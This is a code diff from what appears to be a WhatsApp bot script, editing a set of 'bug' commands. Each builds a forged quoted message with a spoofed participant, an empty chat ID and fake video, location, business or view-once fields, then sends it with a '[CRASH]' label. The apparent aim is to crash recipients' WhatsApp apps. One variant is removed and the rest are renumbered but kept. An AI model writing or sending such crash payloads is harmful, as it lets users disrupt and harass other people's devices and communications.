@@ -3541,23 +3541,6 @@ message: {
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:foce})
 break
 case 'bugv5':
-let fgif = { 
-key: {
-fromMe: false,
-participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
-},
-message: { "videoMessage": { 
-"title":"hallo bang","h": 
-`Hmm`,'seconds': '99999', 
-'gifPlayback': 'true', 
-'caption': `ʜᴀɴᴢ々ᴏꜰᴄ`,
-'jpegThumbnail': fs.readFileSync(`./menu1.jpeg`),
-}
-}
-}
-hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fgif})
-break
-case 'bugv6':
 let floc = {
 key : {
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
@@ -3571,7 +3554,7 @@ jpegThumbnail: fs.readFileSync(`./menu1.jpeg`),
 }
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:floc})
 break 
-case 'bugv7':
+case 'bugv6':
 let ftoko = { 
 key: { 
 fromMe: false, 
@@ -3592,7 +3575,7 @@ message: {
 "businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:f})
 break
-case 'bugv8':
+case 'bugv7':
 let foncevid = { 
 key: {
 fromMe: false, 
@@ -3607,7 +3590,7 @@ viewOnce: true
 };
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:foncevid})
 break
-case 'bugv9':
+case 'bugv8':
 let fonceimg = {
 key: {
 fromMe: false,
@@ -3621,7 +3604,7 @@ viewOnce: true
 };
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fonceimg})
 break
-case 'bugv10':
+case 'bugv9':
 let fgc = { 
 key: {
 fromMe: false,
@@ -3636,7 +3619,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
  'jpegThumbnail': fs.readFileSync('./menu1.jpeg')}}}
 hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:fgc})
 break
-case 'bugv11':
+case 'bugv10':
 let anu = { 
 "key": {
 "participant": `0@s.whatsapp.net`,
@@ -3663,7 +3646,7 @@ let anu = {
  hisoka.sendMessage(m.chat, {text:"HANZ々OFC彡 [CRASH]"},{quoted:anu})
  break
 //Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
-case 'bugv12':
+case 'bugv11':
 let fkon = { 
 key: { 
 fromMe: false, 
